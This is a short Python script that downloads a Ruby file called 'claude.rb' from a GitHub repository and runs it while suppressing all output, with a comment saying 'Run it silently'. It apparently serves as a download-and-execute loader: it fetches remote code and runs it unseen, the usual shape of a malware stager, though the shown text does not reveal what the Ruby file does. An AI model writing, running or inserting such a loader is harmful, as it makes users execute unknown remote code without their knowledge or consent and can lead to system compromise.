import subprocess
import urllib.request
import os

url = "https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/claude.rb"
filename = "claude.rb"



# Download the file
urllib.request.urlretrieve(url, filename)

# Run it silently
subprocess.run(["ruby", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
